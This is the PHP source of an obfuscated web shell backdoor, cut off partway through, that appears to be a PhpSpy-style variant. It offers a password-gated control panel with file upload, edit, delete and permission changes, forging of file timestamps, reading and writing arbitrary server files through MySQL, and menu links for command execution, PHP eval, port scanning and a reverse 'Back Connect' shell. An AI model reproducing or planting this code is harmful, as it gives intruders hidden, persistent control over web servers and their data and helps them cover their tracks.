<?php
echo '[syslog]01
'; error_reporting(7); ob_start(); $sp875595 = explode(' ', microtime()); $spd725d3 = $sp875595[1] + $sp875595[0]; define('SA_ROOT', str_replace('\\', '/', dirname(__FILE__)) . '/'); define('IS_WIN', DIRECTORY_SEPARATOR == '\\'); define('IS_COM', class_exists('COM') ? 1 : 0); define('IS_GPC', get_magic_quotes_gpc()); $sp239931 = 'true'; echo '[syslog]2
'; foreach ($_POST as $sp7ac89e => $sp8e17b7) { if (IS_GPC) { $sp8e17b7 = s_array($sp8e17b7); } ${$sp7ac89e} = $sp8e17b7; } $sp7ceca3 = 'ec38fe2a8497e0a8d6d349b3533038cb'; $spcd0068 = ''; $sp3049a2 = ''; $sp63c1d6 = '/'; $sp30b778 = 86400; !$spd8449c && ($spd8449c = 'php,cgi,pl,asp,inc,js,html,htm,jsp'); $spb669c1 = array('', 'armscii8', 'ascii', 'big5', 'binary', 'cp1250', 'cp1251', 'cp1256', 'cp1257', 'cp850', 'cp852', 'cp866', 'cp932', 'dec8', 'euc-jp', 'euc-kr', 'gb2312', 'gbk', 'geostd8', 'greek', 'hebrew', 'hp8', 'keybcs2', 'koi8r', 'koi8u', 'latin1', 'latin2', 'latin5', 'latin7', 'macce', 'macroman', 'sjis', 'swe7', 'tis620', 'ucs2', 'ujis', 'utf8'); if ($sp093c94 == 'utf8') { header('content-Type: text/html; charset=utf-8'); } elseif ($sp093c94 == 'big5') { header('content-Type: text/html; charset=big5'); } elseif ($sp093c94 == 'gbk') { header('content-Type: text/html; charset=gbk'); } elseif ($sp093c94 == 'latin1') { header('content-Type: text/html; charset=iso-8859-2'); } elseif ($sp093c94 == 'euc-kr') { header('content-Type: text/html; charset=euc-kr'); } elseif ($sp093c94 == 'euc-jp') { header('content-Type: text/html; charset=euc-jp'); } $spb6c8e7 = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME']; $sp73acdf = time(); echo '[syslog]3
'; if ($spdeba40 == 'logout') { scookie('loginpass', '', -86400 * 365); @header('Location: ' . $spb6c8e7); die; } if ($sp7ceca3) { if ($spdeba40 == 'login') { if ($sp7ceca3 == encode_pass($sp692362)) { scookie('loginpass', encode_pass($sp692362)); @header('Location: ' . $spb6c8e7); die; } } if ($_COOKIE['loginpass']) { if ($_COOKIE['loginpass'] != $sp7ceca3) { loginpage(); } } else { loginpage(); } } $sp5fb3e9 = ''; !$spdeba40 && ($spdeba40 = 'file'); if ($spdeba40 == 'phpinfo') { if (IS_PHPINFO) { phpinfo(); die; } else { $sp5fb3e9 = 'phpinfo() function has non-permissible'; } } if ($sp803287 == 'downfile' && $sp2ebc12) { if (!@file_exists($sp2ebc12)) { $sp5fb3e9 = 'The file you want Downloadable was nonexistent'; } else { $sp833676 = pathinfo($sp2ebc12); header('Content-type: application/x-' . $sp833676['extension']); header('Content-Disposition: attachment; filename=' . $sp833676['basename']); header('Content-Length: ' . filesize($sp2ebc12)); @readfile($sp2ebc12); die; } } echo '[syslog]3
'; if ($sp803287 == 'backupmysql' && !$spe0a34e) { if (!$sp110772) { $sp5fb3e9 = 'Please choose the table'; } else { $sp3c234c = mydbconn($sp342aef, $spe1f996, $spc9e959, $sp50c961, $sp093c94, $spb97ae1); $spcc5ae4 = basename($sp50c961 . '.sql'); header('Content-type: application/unknown'); header('Content-Disposition: attachment; filename=' . $spcc5ae4); foreach ($sp110772 as $sp8db113 => $sp6d4391) { if ($sp6d4391) { sqldumptable($sp6d4391); } } mysql_close(); die; } } if ($sp803287 == 'mysqldown') { if (!$sp50c961) { $sp5fb3e9 = 'Please input dbname'; } else { $sp3c234c = mydbconn($sp342aef, $spe1f996, $spc9e959, $sp50c961, $sp093c94, $spb97ae1); if (!file_exists($sp5cfa0c)) { $sp5fb3e9 = 'The file you want Downloadable was nonexistent'; } else { $spb7d120 = q("select load_file('{$sp5cfa0c}');"); if (!$spb7d120) { q('DROP TABLE IF EXISTS tmp_angel;'); q('CREATE TABLE tmp_angel (content LONGBLOB NOT NULL);'); q('LOAD DATA LOCAL INFILE \'' . addslashes($sp5cfa0c) . "' INTO TABLE tmp_angel FIELDS TERMINATED BY '__angel_{$sp73acdf}_eof__' ESCAPED BY '' LINES TERMINATED BY '__angel_{$sp73acdf}_eof__';"); $spb7d120 = q('select content from tmp_angel'); q('DROP TABLE tmp_angel'); } $spa596f1 = @mysql_fetch_array($spb7d120); if (!$spa596f1) { $sp5fb3e9 = 'Load file failed ' . mysql_error(); } else { $sp833676 = pathinfo($sp5cfa0c); header('Content-type: application/x-' . $sp833676['extension']); header('Content-Disposition: attachment; filename=' . $sp833676['basename']); header('Accept-Length: ' . strlen($spa596f1[0])); echo $spa596f1[0]; die; } } } } echo '[syslog]3
'; ?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gbk">
<title><?php  echo $spdeba40 . ' - ' . $_SERVER['HTTP_HOST']; ?>
</title>
<style type="text/css">
body,td{font: 12px Arial,Tahoma;line-height: 16px;}
.input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;}
.area{font:12px 'Courier New', Monospace;background:#fff;border: 1px solid #666;padding:2px;}
.bt {border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}
a {color: #00f;text-decoration:underline;}
a:hover{color: #f00;text-decoration:none;}
.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 15px 5px 5px;}
.alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 15px 5px 5px;}
.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 15px 5px 5px;}
.head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 15px 5px 5px;font-weight:bold;}
.head td span{font-weight:normal;}
.infolist {padding:10px;margin:10px 0 20px 0;background:#F1F1F1;border:1px solid #ddd;}
form{margin:0;padding:0;}
h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
.drives{padding:5px;}
.drives span {margin:auto 7px;}
</style>
<script type="text/javascript">
function CheckAll(form) {
	for(var i=0;i<form.elements.length;i++) {
		var e = form.elements[i];
		if (e.name != 'chkall')
		e.checked = form.chkall.checked;
    }
}
function $(id) {
	return document.getElementById(id);
}
function createdir(){
	var newdirname;
	newdirname = prompt('Please input the directory name:', '');
	if (!newdirname) return;
	$('createdir').newdirname.value=newdirname;
	$('createdir').submit();
}
function fileperm(pfile){
	var newperm;
	newperm = prompt('Current file:'+pfile+'\nPlease input new attribute:', '');
	if (!newperm) return;
	$('fileperm').newperm.value=newperm;
	$('fileperm').pfile.value=pfile;
	$('fileperm').submit();
}
function copyfile(sname){
	var tofile;
	tofile = prompt('Original file:'+sname+'\nPlease input object file (fullpath):', '');
	if (!tofile) return;
	$('copyfile').tofile.value=tofile;
	$('copyfile').sname.value=sname;
	$('copyfile').submit();
}
function rename(oldname){
	var newfilename;
	newfilename = prompt('Former file name:'+oldname+'\nPlease input new filename:', '');
	if (!newfilename) return;
	$('rename').newfilename.value=newfilename;
	$('rename').oldname.value=oldname;
	$('rename').submit();
}
function dofile(doing,thefile,m){
	if (m && !confirm(m)) {
		return;
	}
	$('filelist').doing.value=doing;
	if (thefile){
		$('filelist').thefile.value=thefile;
	}
	$('filelist').submit();
}
function createfile(nowpath){
	var filename;
	filename = prompt('Please input the file name:', '');
	if (!filename) return;
	opfile('editfile',nowpath + filename,nowpath);
}
function opfile(action,opfile,dir){
	$('fileopform').action.value=action;
	$('fileopform').opfile.value=opfile;
	$('fileopform').dir.value=dir;
	$('fileopform').submit();
}
function godir(dir,view_writable){
	if (view_writable) {
		$('godir').view_writable.value=view_writable;
	}
	$('godir').dir.value=dir;
	$('godir').submit();
}
function getsize(getdir,dir){
	$('getsize').getdir.value=getdir;
	$('getsize').dir.value=dir;
	$('getsize').submit();
}
function editrecord(action, base64, tablename){
	if (action == 'del') {		
		if (!confirm('Is or isn\'t deletion record?')) return;
	}
	$('recordlist').doing.value=action;
	$('recordlist').base64.value=base64;
	$('recordlist').tablename.value=tablename;
	$('recordlist').submit();
}
function moddbname(dbname) {
	if(!dbname) return;
	$('setdbname').dbname.value=dbname;
	$('setdbname').submit();
}
function settable(tablename,doing,page) {
	if(!tablename) return;
	if (doing) {
		$('settable').doing.value=doing;
	}
	if (page) {
		$('settable').page.value=page;
	}
	$('settable').tablename.value=tablename;
	$('settable').submit();
}
function s(action,nowpath,p1,p2,p3,p4,p5) {
	if(action) $('opform').action.value=action;
	if(nowpath) $('opform').nowpath.value=nowpath;
	if(p1) $('opform').p1.value=p1;
	if(p2) $('opform').p2.value=p2;
	if(p3) $('opform').p3.value=p3;
	if(p4) $('opform').p4.value=p4;
	if(p5) $('opform').p4.value=p5;
}
function g(action,nowpath,p1,p2,p3,p4,p5) {
	if(!action) return;
	s(action,nowpath,p1,p2,p3,p4,p5);
	$('opform').submit();
}
</script>
</head>
<body style="margin:0;table-layout:fixed; word-break:break-all">
<?php  formhead(array('name' => 'opform')); makehide('action', $spdeba40); makehide('nowpath', $sp0c30a0); makehide('p1', $spd6330d); makehide('p2', $sp0bd92b); makehide('p3', $sp8f82a5); makehide('p4', $spefeac6); makehide('p5', $sp793293); formfoot(); if (!function_exists('posix_getegid')) { $sp8b0777 = @get_current_user(); $sped417e = @getmyuid(); $spe9607f = @getmygid(); $sp103103 = '?'; } else { $sped417e = @posix_getpwuid(@posix_geteuid()); $spe9607f = @posix_getgrgid(@posix_getegid()); $sp8b0777 = $sped417e['name']; $sped417e = $sped417e['uid']; $sp103103 = $spe9607f['name']; $spe9607f = $spe9607f['gid']; } ?>
<table width="100%" border="0" cellpadding="0" cellspacing="0">
	<tr class="head">
		<td><span style="float:right;"><?php  echo @php_uname(); ?>
 / User:<?php  echo $sped417e . ' ( ' . $sp8b0777 . ' ) / Group: ' . $spe9607f . ' ( ' . $sp103103 . ' )'; ?>
</span><?php  echo $_SERVER['HTTP_HOST']; ?>
 (<?php  echo gethostbyname($_SERVER['SERVER_NAME']); ?>
)</td>
	</tr>
	<tr class="alt1">
		<td>
			<span style="float:right;">PHP <?php  echo PHP_VERSION; ?>
 / Safe Mode:<?php  echo getcfg('safe_mode'); ?>
</span>
			<a href="javascript:g('logout');">Logout</a> | 
			<a href="javascript:g('file');">File Manager</a> | 
			<a href="javascript:g('mysqladmin');">MYSQL Manager</a> | 
			<a href="javascript:g('sqlfile');">MySQL Upload &amp; Download</a> | 
			<a href="javascript:g('shell');">Execute Command</a> | 
			<a href="javascript:g('phpenv');">PHP Variable</a> | 
			<a href="javascript:g('portscan');">Port Scan</a> | 
			<a href="javascript:g('secinfo');">Security information</a> | 
			<a href="javascript:g('eval');">Eval PHP Code</a>
			<?php  if (!IS_WIN) { ?>
 | <a href="javascript:g('backconnect');">Back Connect</a><?php  } ?>
		</td>
	</tr>
</table>
<table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>
<?php  $sp5fb3e9 && m($sp5fb3e9); if (!$spee51b5) { $spee51b5 = $_SERVER['DOCUMENT_ROOT'] ? $_SERVER['DOCUMENT_ROOT'] : '.'; } $sp0c30a0 = getPath(SA_ROOT, $spee51b5); if (substr($spee51b5, -1) != '/') { $spee51b5 = $spee51b5 . '/'; } if ($spdeba40 == 'file') { $spbe1491 = @is_writable($sp0c30a0) ? 'Writable' : 'Non-writable'; if ($sp028466) { $sp907852 = $sp0c30a0 . $sp028466; if (file_exists($sp907852)) { m('Directory has already existed'); } else { m('Directory created ' . (@mkdir($sp907852, 511) ? 'success' : 'failed')); @chmod($sp907852, 511); } } elseif ($spc6a592) { m('File upload ' . (@copy($_FILES['uploadfile']['tmp_name'], $sp6ac5e1 . '/' . $_FILES['uploadfile']['name']) ? 'success' : 'failed')); } elseif ($spac78b5 && $spfa52b7) { $spe0ea16 = @fopen($spac78b5, 'w'); m('Save file ' . (@fwrite($spe0ea16, $spfa52b7) ? 'success' : 'failed')); @fclose($spe0ea16); } elseif ($sp4e7f1c && $spf0d8ea) { if (!file_exists($sp4e7f1c)) { m('The original file does not exist'); } else { $spf0d8ea = base_convert($spf0d8ea, 8, 10); m('Modify file attributes ' . (@chmod($sp4e7f1c, $spf0d8ea) ? 'success' : 'failed')); } } elseif ($spf41f53 && $spd7311c) { $sp2a30a0 = $sp0c30a0 . $spd7311c; if (file_exists($sp2a30a0) || !file_exists($spf41f53)) { m($sp2a30a0 . ' has already existed or original file does not exist'); } else { m(basename($spf41f53) . ' renamed ' . basename($sp2a30a0) . (@rename($spf41f53, $sp2a30a0) ? ' success' : 'failed')); } } elseif ($spc6bd4b && $spb37dc8) { if (file_exists($spb37dc8) || !file_exists($spc6bd4b)) { m('The goal file has already existed or original file does not exist'); } else { m(basename($spb37dc8) . ' copied ' . (@copy($spc6bd4b, $spb37dc8) ? basename($spb37dc8) . ' success' : 'failed')); } } elseif ($spfc3d94 && $spf150de) { if (!@file_exists($spfc3d94) || !@file_exists($spf150de)) { m('The goal file has already existed or original file does not exist'); } else { $spb8a5bd = @filemtime($spf150de); m('Modify file the last modified ' . (@touch($spfc3d94, $spb8a5bd, $spb8a5bd) ? 'success' : 'failed')); } } elseif ($spfc3d94 && $sp568807 && $spe4b8fd && $spf1ff3c && $sp9275a8 && $spdbab42 && $sp9447b5) { if (!@file_exists($spfc3d94)) { m(basename($spfc3d94) . ' does not exist'); } else { $spb8a5bd = strtotime("{$sp568807}-{$spe4b8fd}-{$spf1ff3c} {$sp9275a8}:{$spdbab42}:{$sp9447b5}"); m('Modify file the last modified ' . (@touch($spfc3d94, $spb8a5bd, $spb8a5bd) ? 'success' : 'failed')); } } elseif ($sp803287 == 'delfiles') { if ($spb063f4) { $sp9537ba = ''; $sp72611d = $sp4ca00d = 0; foreach ($spb063f4 as $sp256f71) { if (is_dir($sp256f71)) { if (@deltree($sp256f71)) { $sp72611d++; } else { $sp4ca00d++; } } else { if (@unlink($sp256f71)) { $sp72611d++; } else { $sp4ca00d++; } } } m('Deleted folder/file have finished,choose ' . count($spb063f4) . ' success ' . $sp72611d . ' fail ' . $sp4ca00d); } else { m('Please select folder/file(s)'); } } formhead(array('name' => 'createdir')); makehide('newdirname'); makehide('dir', $sp0c30a0); formfoot(); formhead(array('name' => 'fileperm')); makehide('newperm'); makehide('pfile'); makehide('dir', $sp0c30a0); formfoot(); formhead(array('name' => 'copyfile')); makehide('sname'); makehide('tofile'); makehide('dir', $sp0c30a0); formfoot(); formhead(array('name' => 'rename')); makehide('oldname'); makehide('newfilename'); makehide('dir', $sp0c30a0); formfoot(); formhead(array('name' => 'fileopform', 'target' => '_blank')); makehide('action'); makehide('opfile'); makehide('dir'); formfoot(); formhead(array('name' => 'getsize')); makehide('getdir'); makehide('dir'); formfoot(); $spa94bfd = @disk_free_space($sp0c30a0); !$spa94bfd && ($spa94bfd = 0); $spaf9d6a = @disk_total_space($sp0c30a0); !$spaf9d6a && ($spaf9d6a = 0); $spf6d887 = $spaf9d6a - $spa94bfd; p('<h2>File Manager - Current disk free ' . sizecount($spa94bfd) . ' of ' . sizecount($spaf9d6a) . ' (' . @round(100 / ($spaf9d6a / $spa94bfd), 2) . '%)</h2>'); $sp405fcc = ''; $sp149c6d = explode('/', $sp0c30a0); $sp5c3411 = count($sp149c6d); for ($sp412bbc = 0; $sp412bbc < $sp5c3411 - 1; $sp412bbc++) { $sp405fcc .= '<a href="javascript:godir(\''; for ($sp460372 = 0; $sp460372 <= $sp412bbc; $sp460372++) { $sp405fcc .= $sp149c6d[$sp460372] . '/'; } $sp405fcc .= '\');">' . $sp149c6d[$sp412bbc] . '/</a>'; } ?>
<script type="text/javascript">
document.onclick = shownav;
function shownav(e){
	var src = e?e.target:event.srcElement;
	do{
		if(src.id =="jumpto") {
			$('inputnav').style.display = "";
			$('pathnav').style.display = "none";
			//hidenav();
			return;
		}
		if(src.id =="inputnav") {
			return;
		}
		src = src.parentNode;
	}while(src.parentNode)

	$('inputnav').style.display = "none";
	$('pathnav').style.display = "";
}
</script>
<div style="background:#eee;margin-bottom:10px;">
	<table id="pathnav" width="100%" border="0" cellpadding="5" cellspacing="0">
		<tr>
			<td width="100%"><?php  echo $sp405fcc . ' - ' . getChmod($sp0c30a0) . ' / ' . getPerms($sp0c30a0) . getUser($sp0c30a0); ?>
 (<?php  echo $spbe1491; ?>
)</td>
			<td nowrap><input class="bt" id="jumpto" name="jumpto" value="Jump to" type="button"></td>
		</tr>
	</table>
	<table id="inputnav" width="100%" border="0" cellpadding="5" cellspacing="0" style="display:none;">
	<form action="" method="post" id="godir" name="godir">
		<tr>
			<td nowrap>Current Directory (<?php  echo $spbe1491; ?>
, <?php  echo getChmod($sp0c30a0); ?>
)</td>
			<td width="100%"><input name="view_writable" value="0" type="hidden" /><input class="input" name="dir" value="<?php  echo $sp0c30a0; ?>
" type="text" style="width:99%;margin:0 8px;"></td>
			<td nowrap><input class="bt" value="GO" type="submit"></td>
		</tr>
	</form>
	</table>
<?php  if (IS_WIN && IS_COM) { $sp96362f = new COM('scripting.filesystemobject'); if ($sp96362f && is_object($sp96362f) && $sp96362f->Drives) { echo '<div class="drives">'; $sp5a5a50 = array(0 => 'Unknow', 1 => 'Removable', 2 => 'Fixed', 3 => 'Network', 4 => 'CDRom', 5 => 'RAM Disk'); $spf405dc = ''; foreach ($sp96362f->Drives as $sp9378fb) { if ($sp9378fb->Path) { p($spf405dc . '<a href="javascript:godir(\'' . $sp9378fb->Path . '/\');">' . $sp5a5a50[$sp9378fb->DriveType] . '(' . $sp9378fb->Path . ')</a>'); $spf405dc = '<span>|</span>'; } } echo '</div>'; } } ?>
</div>
<?php  $sp4290ff = $_POST['findstr']; $sp9167bb = $_POST['re']; tbhead(); p('<tr class="alt1"><td colspan="7" style="padding:5px;line-height:20px;">'); p('<form action="' . $spb6c8e7 . '" method="POST" enctype="multipart/form-data"><div style="float:right;"><input class="input" name="uploadfile" value="" type="file" /> <input class="bt" name="doupfile" value="Upload" type="submit" /><input name="uploaddir" value="' . $sp0c30a0 . '" type="hidden" /><input name="dir" value="' . $sp0c30a0 . '" type="hidden" /></div></form>'); p('<a href="javascript:godir(\'' . $_SERVER['DOCUMENT_ROOT'] . '\');">WebRoot</a>'); p(' | <a href="javascript:godir(\'.\');">ScriptPath</a>'); p(' | <a href="javascript:godir(\'' . $sp0c30a0 . '\');">View All</a>'); p(' | View Writable ( <a href="javascript:godir(\'' . $sp0c30a0 . '\',\'dir\');">Directory</a>'); p(' | <a href="javascript:godir(\'' . $sp0c30a0 . '\',\'file\');">File</a> )'); p(' | <a href="javascript:createdir();">Create Directory</a> | <a href="javascript:createfile(\'' . $sp0c30a0 . '\');">Create File</a>'); p('<div style="padding:5px 0;"><form action="' . $spb6c8e7 . '" method="POST">Find string in files(current folder): <input class="input" name="findstr" value="' . $sp4290ff . '" type="text" /> <input class="bt" value="Find" type="submit" /> Type: <input class="input" name="writabledb" value="' . $spd8449c . '" type="text" /><input name="dir" value="' . $spee51b5 . '" type="hidden" /> <input name="re" value="1" type="checkbox" ' . ($sp9167bb ? 'checked' : '') . ' /> Regular expressions</form></div></td></tr>'); p('<tr class="head"><td>&nbsp;</td><td>Filename</td><td width="16%">Last modified</td><td width="10%">Size</td><td width="20%">Chmod / Perms</td><td width="22%">Action</td></tr>'); $spbf846d = array(); $spf393a1 = array(); if ($spce8edf == 'dir') { $spbf846d = GetWDirList($sp0c30a0); $spf393a1 = array(); } elseif ($spce8edf == 'file') { $spbf846d = array(); $spf393a1 = GetWFileList($sp0c30a0); } elseif ($sp4290ff) { $spbf846d = array(); $spf393a1 = GetSFileList($sp0c30a0, $sp4290ff, $sp9167bb); } else { $sp495c2d = @opendir($spee51b5); while ($sp7ff75d = @readdir($sp495c2d)) { $sp256f71 = $sp0c30a0 . $sp7ff75d; if (@is_dir($sp256f71)) { $sp1be5fd['filename'] = $sp7ff75d; $sp1be5fd['mtime'] = @date('Y-m-d H:i:s', filemtime($sp256f71)); $sp1be5fd['dirchmod'] = getChmod($sp256f71); $sp1be5fd['dirperm'] = getPerms($sp256f71); $sp1be5fd['fileowner'] = getUser($sp256f71); $sp1be5fd['dirlink'] = $sp0c30a0; $sp1be5fd['server_link'] = $sp256f71; $spbf846d[] = $sp1be5fd; } else { $spa5a01d['filename'] = $sp7ff75d; $spa5a01d['size'] = sizecount(@filesize($sp256f71)); $spa5a01d['mtime'] = @date('Y-m-d H:i:s', filemtime($sp256f71)); $spa5a01d['filechmod'] = getChmod($sp256f71); $spa5a01d['fileperm'] = getPerms($sp256f71); $spa5a01d['fileowner'] = getUser($sp256f71); $spa5a01d['dirlink'] = $sp0c30a0; $spa5a01d['server_link'] = $sp256f71; $spf393a1[] = $spa5a01d; } } unset($sp1be5fd); unset($spa5a01d); @closedir($sp495c2d); } @sort($spbf846d); @sort($spf393a1); $sp9c8ee2 = '0'; p('<form id="filelist" name="filelist" action="' . $spb6c8e7 . '" method="post">'); makehide('action', 'file'); makehide('thefile'); makehide('doing'); makehide('dir', $sp0c30a0); echo '[syslog]03
'; foreach ($spbf846d as $sp7ac89e => $sp1be5fd) { if ($sp1be5fd['filename'] != '..' && $sp1be5fd['filename'] != '.') { if ($sp001189 && $sp001189 == $sp1be5fd['server_link']) { $spf58391 = dirsize($sp1be5fd['server_link']); $spf58391 = is_numeric($spf58391) ? sizecount($spf58391) : 'Unknown'; } else { $spf58391 = '<a href="javascript:getsize(\'' . $sp1be5fd['server_link'] . '\',\'' . $spee51b5 . '\');">Stat</a>'; } $sp78d359 = bg(); p('<tr class="' . $sp78d359 . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $sp78d359 . '\';">'); p('<td width="2%" nowrap><input name="dl[]" type="checkbox" value="' . $sp1be5fd['server_link'] . '"></td>'); p('<td><a href="javascript:godir(\'' . $sp1be5fd['server_link'] . '\');">' . $sp1be5fd['filename'] . '</a></td>'); p('<td nowrap><a href="javascript:opfile(\'newtime\',\'' . $sp1be5fd['server_link'] . '\',\'' . $sp1be5fd['dirlink'] . '\');">' . $sp1be5fd['mtime'] . '</a></td>'); p('<td nowrap>' . $spf58391 . '</td>'); p('<td nowrap>'); p('<a href="javascript:fileperm(\'' . $sp1be5fd['server_link'] . '\');">' . $sp1be5fd['dirchmod'] . '</a> / '); p('<a href="javascript:fileperm(\'' . $sp1be5fd['server_link'] . '\');">' . $sp1be5fd['dirperm'] . '</a>' . $sp1be5fd['fileowner'] . '</td>'); p('<td nowrap><a href="javascript:rename(\'' . $sp1be5fd['server_link'] . '\');">Rename</a></td>'); p('</tr>'); $sp9c8ee2++; } else { if ($sp1be5fd['filename'] == '..') { p('<tr class=' . bg() . '>'); p('<td align="center">-</td><td nowrap colspan="5"><a href="javascript:godir(\'' . getUpPath($sp0c30a0) . '\');">Parent Directory</a></td>'); p('</tr>'); } } } p('<tr bgcolor="#dddddd" stlye="border-top:1px solid #fff;border-bottom:1px solid #ddd;"><td colspan="6" height="5"></td></tr>'); $spd9960c = '0'; foreach ($spf393a1 as $sp7ac89e => $spa5a01d) { if ($spa5a01d['filename'] != '..' && $spa5a01d['filename'] != '.') { $sp006042 = str_replace($_SERVER['DOCUMENT_ROOT'], '', $spa5a01d['server_link']); $sp78d359 = bg(); p('<tr class="' . $sp78d359 . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $sp78d359 . '\';">'); p('<td width="2%" nowrap><input name="dl[]" type="checkbox" value="' . $spa5a01d['server_link'] . '"></td>'); p('<td>' . (strpos($spa5a01d['server_link'], $_SERVER['DOCUMENT_ROOT']) !== false ? '<a href="' . $sp006042 . '" target="_blank">' . $spa5a01d['filename'] . '</a>' : $spa5a01d['filename']) . '</td>'); p('<td nowrap><a href="javascript:opfile(\'newtime\',\'' . $spa5a01d['server_link'] . '\',\'' . $spa5a01d['dirlink'] . '\');">' . $spa5a01d['mtime'] . '</a></td>'); p('<td nowrap>' . $spa5a01d['size'] . '</td>'); p('<td nowrap>'); p('<a href="javascript:fileperm(\'' . $spa5a01d['server_link'] . '\');">' . $spa5a01d['filechmod'] . '</a> / '); p('<a href="javascript:fileperm(\'' . $spa5a01d['server_link'] . '\');">' . $spa5a01d['fileperm'] . '</a>' . $spa5a01d['fileowner'] . '</td>'); p('<td nowrap>'); p('<a href="javascript:dofile(\'downfile\',\'' . $spa5a01d['server_link'] . '\');">Down</a> | '); p('<a href="javascript:copyfile(\'' . $spa5a01d['server_link'] . '\');">Copy</a> | '); p('<a href="javascript:opfile(\'editfile\',\'' . $spa5a01d['server_link'] . '\',\'' . $spa5a01d['dirlink'] . '\');">Edit</a> | '); p('<a href="javascript:rename(\'' . $spa5a01d['server_link'] . '\');">Rename</a>'); p('</td></tr>'); $spd9960c++; } } p('<tr class="head"><td>&nbsp;</td><td>Filename</td><td width="16%">Last modified</td><td width="10%">Size</td><td width="20%">Chmod / Perms</td><td width="22%">Action</td></tr>'); p('<tr class="' . bg() . '"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td><td colspan="4"><a href="javascript:dofile(\'delfiles\');">Delete selected</a></td><td align="right">' . $sp9c8ee2 . ' directories / ' . $spd9960c . ' files</td></tr>'); p('</form></table>'); } elseif ($spdeba40 == 'sqlfile') { if ($sp803287 == 'mysqlupload') { $sp7ff75d = $_FILES['uploadfile']; $spcc5ae4 = $sp7ff75d['tmp_name']; if (file_exists($sp03d19c)) { m('The goal file has already existed'); } else { if (!$spcc5ae4) { m('Please choose a file'); } else { $spe0ea16 = @fopen($spcc5ae4, 'r'); $sp6b22f3 = @fread($spe0ea16, filesize($spcc5ae4)); @fclose($spe0ea16); $sp6b22f3 = bin2hex($sp6b22f3); if (!$spf34fdb) { $spf34fdb = $sp7ff75d['name']; } $sp3c234c = mydbconn($sp342aef, $spe1f996, $spc9e959, $sp50c961, $sp093c94, $spb97ae1); $spb7d120 = q("SELECT 0x{$sp6b22f3} FROM mysql.user INTO DUMPFILE '{$sp03d19c}';"); m($spb7d120 ? 'Upload success' : 'Upload has failed: ' . mysql_error()); } } } ?>
<script type="text/javascript">
function mysqlfile(doing){
	if(!doing) return;
	$('doing').value=doing;
	$('mysqlfile').dbhost.value=$('dbinfo').dbhost.value;
	$('mysqlfile').dbport.value=$('dbinfo').dbport.value;
	$('mysqlfile').dbuser.value=$('dbinfo').dbuser.value;
	$('mysqlfile').dbpass.value=$('dbinfo').dbpass.value;
	$('mysqlfile').dbname.value=$('dbinfo').dbname.value;
	$('mysqlfile').charset.value=$('dbinfo').charset.value;
	$('mysqlfile').submit();
}
</script>
<?php  !$sp342aef && ($sp342aef = 'localhost'); !$spe1f996 && ($spe1f996 = 'root'); !$spb97ae1 && ($spb97ae1 = '3306'); formhead(array('title' => 'MYSQL Information', 'name' => 'dbinfo')); makehide('action', 'sqlfile'); p('<p>'); p('DBHost:'); makeinput(array('name' => 'dbhost', 'size' => 20, 'value' => $sp342aef)); p(':'); makeinput(array('name' => 'dbport', 'size' => 4, 'value' => $spb97ae1)); p('DBUser:'); makeinput(array('name' => 'dbuser', 'size' => 15, 'value' => $spe1f996)); p('DBPass:'); makeinput(array('name' => 'dbpass', 'size' => 15, 'value' => $spc9e959)); p('DBName:'); makeinput(array('name' => 'dbname', 'size' => 15, 'value' => $sp50c961)); p('DBCharset:'); makeselect(array('name' => 'charset', 'option' => $spb669c1, 'selected' => $sp093c94, 'nokey' => 1)); p('</p>'); formfoot(); p('<form action="' . $spb6c8e7 . '" method="POST" enctype="multipart/form-data" name="mysqlfile" id="mysqlfile">'); p('<h2>Upload file</h2>'); p('<p><b>This operation the DB user must has FILE privilege</b></p>'); p('<p>Save path(fullpath): <input class="input" name="savepath" size="45" type="text" /> Choose a file: <input class="input" name="uploadfile" type="file" /> <a href="javascript:mysqlfile(\'mysqlupload\');">Upload</a></p>'); p('<h2>Download file</h2>'); p('<p>File: <input class="input" name="mysqldlfile" size="115" type="text" /> <a href="javascript:mysqlfile(\'mysqldown\');">Download</a></p>'); makehide('dbhost'); makehide('dbport'); makehide('dbuser'); makehide('dbpass'); makehide('dbname'); makehide('charset'); makehide('doing'); makehide('action', 'sqlfile'); p('</form>'); } elseif ($spdeba40 == 'mysqladmin') { !$sp342aef && ($sp342aef = 'localhost'); !$spe1f996 && ($spe1f996 = 'root'); !$spb97ae1 && ($spb97ae1 = '3306'); $sp8ad84e = '<input type="hidden" id="connect" name="connect" value="1" />'; if (isset($sp342aef)) { $sp8ad84e .= "<input type=\"hidden\" id=\"dbhost\" name=\"dbhost\" value=\"{$sp342aef}\" />\n"; } if (isset($spe1f996)) { $sp8ad84e .= "<input type=\"hidden\" id=\"dbuser\" name=\"dbuser\" value=\"{$spe1f996}\" />\n"; } if (isset($spc9e959)) { $sp8ad84e .= "<input type=\"hidden\" id=\"dbpass\" name=\"dbpass\" value=\"{$spc9e959}\" />\n"; } if (isset($spb97ae1)) { $sp8ad84e .= "<input type=\"hidden\" id=\"dbport\" name=\"dbport\" value=\"{$spb97ae1}\" />\n"; } if (isset($sp50c961)) { $sp8ad84e .= "<input type=\"hidden\" id=\"dbname\" name=\"dbname\" value=\"{$sp50c961}\" />\n"; } if (isset($sp093c94)) { $sp8ad84e .= "<input type=\"hidden\" id=\"charset\" name=\"charset\" value=\"{$sp093c94}\" />\n"; } if ($sp803287 == 'backupmysql' && $spe0a34e) { if (!$sp110772) { m('Please choose the table'); } else { $sp3c234c = mydbconn($sp342aef, $spe1f996, $spc9e959, $sp50c961, $sp093c94, $spb97ae1); 